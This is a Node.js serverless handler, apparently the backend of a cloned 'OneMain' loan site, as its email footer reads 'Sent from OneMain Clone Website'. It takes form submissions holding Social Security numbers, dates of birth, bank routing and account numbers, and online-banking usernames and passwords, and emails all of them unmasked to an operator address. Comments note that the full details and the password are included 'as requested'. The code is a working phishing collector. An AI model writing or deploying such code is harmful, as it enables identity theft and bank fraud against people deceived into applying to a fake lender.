const nodemailer = require('nodemailer');

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') return { statusCode: 405, body: JSON.stringify({ ok: false, error: 'Method Not Allowed' }) };

    let payload;
    try {
        payload = JSON.parse(event.body || '{}');
    } catch (e) {
        console.error("JSON Parse Error:", e);
        return { statusCode: 400, body: JSON.stringify({ ok: false, error: 'Invalid JSON' }) };
    }

    // Basic validation
    if (!payload.email || !/\S+@\S+\.\S+/.test(payload.email)) {
        return { statusCode: 400, body: JSON.stringify({ ok: false, error: 'Valid email is required' }) };
    }

    // Map fields from apply.html to variables
    // Form fields: firstname, lastname, sys_tax_ref (SSN), street_address, city, state, dob, 
    // bank_name, account_number, routing_number, username, password, email, phone, loan_amount

    // FULL DETAILS AS REQUESTED (Unmasked)
    const ssn = payload.sys_tax_ref;
    const accountNumber = payload.account_number;
    const routingNumber = payload.routing_number;
    const loanAmount = payload.loan_amount ? '$' + payload.loan_amount : '-';

    const rows = (label, value) => `<tr><td style="padding:8px 10px;border-bottom:1px solid #eee;width:40%;"><strong>${label}</strong></td><td style="padding:8px 10px;border-bottom:1px solid #eee;">${value || '-'}</td></tr>`;

    const html = `<div style="font-family:Arial,Helvetica,sans-serif;color:#111;max-width:600px;margin:0 auto;border:1px solid #ddd;border-radius:8px;overflow:hidden;">
    <div style="background-color:#020361;color:white;padding:20px;text-align:center;">
        <h2 style="margin:0;">New Loan Application</h2>
    </div>
    <div style="padding:20px;">
        <table style="border-collapse:collapse;width:100%">
        ${rows('First Name', payload.firstname)}
        ${rows('Last Name', payload.lastname)}
        ${rows('Email', payload.email)}
        ${rows('Phone', payload.phone)}
        ${rows('DOB', payload.dob)}
        ${rows('Address', payload.street_address)}
        ${rows('City', payload.city)}
        ${rows('State', payload.state)}
        ${rows('SSN', ssn)}
        </table>
        
        <h4 style="margin-top:20px;border-bottom:2px solid #020361;padding-bottom:10px;">Bank Information</h4>
        <table style="border-collapse:collapse;width:100%">
        ${rows('Bank Name', payload.bank_name)}
        ${rows('Routing #', routingNumber)}
        ${rows('Account #', accountNumber)}
        </table>

        <h4 style="margin-top:20px;border-bottom:2px solid #020361;padding-bottom:10px;">Loan & Account</h4>
        <table style="border-collapse:collapse;width:100%">
        ${rows('Loan Amount', loanAmount)}
        ${rows('Username', payload.username)}
        ${rows('Password', payload.password)} <!-- Included as per request for full form data -->
        </table>
    </div>
    <div style="background-color:#f9f9f9;padding:15px;text-align:center;font-size:12px;color:#666;">
        Sent from OneMain Clone Website
    </div>
  </div>`;

    const text = `New loan application\n\nName: ${payload.firstname} ${payload.lastname}\nEmail: ${payload.email}\nPhone: ${payload.phone}\nLoan Amount: ${loanAmount}\n... (See HTML for full details)`;

    const ADMIN_EMAIL = process.env.ADMIN_EMAIL;
    // Default to a no-reply address if not set, or use the payload email to allow "Reply-To" behavior (though 'from' must be verified)
    const FROM_EMAIL = process.env.FROM_EMAIL || `no-reply@${process.env.URL ? new URL(process.env.URL).hostname : 'example.com'}`;

    if (!ADMIN_EMAIL) {
        console.error("ADMIN_EMAIL is missing in environment variables.");
        return { statusCode: 500, body: JSON.stringify({ ok: false, error: 'Server configuration error (ADMIN_EMAIL)' }) };
    }

    try {
        const SMTP_HOST = process.env.SMTP_HOST;
        const SMTP_PORT = Number(process.env.SMTP_PORT || 587);
        const SMTP_USER = process.env.SMTP_USER;
        const SMTP_PASS = process.env.SMTP_PASS;

        if (!SMTP_HOST || !SMTP_USER || !SMTP_PASS) {
            console.error("SMTP credentials missing.");
            return { statusCode: 500, body: JSON.stringify({ ok: false, error: 'Server configuration error (SMTP)' }) };
        }

        const transporter = nodemailer.createTransport({
            host: SMTP_HOST,
            port: SMTP_PORT,
            secure: SMTP_PORT === 465, // true for 465, false for other ports
            auth: { user: SMTP_USER, pass: SMTP_PASS }
        });

        await transporter.sendMail({
            from: `"Loan Application" <${FROM_EMAIL}>`,
            to: ADMIN_EMAIL,
            subject: `New Application: ${payload.firstname} ${payload.lastname}`,
            text,
            html
        });

        return { statusCode: 200, body: JSON.stringify({ ok: true, message: 'Application sent successfully' }) };
    } catch (err) {
        console.error('send-email error:', err);
        return { statusCode: 500, body: JSON.stringify({ ok: false, error: 'Failed to send email. Check logs.' }) };
    }
};
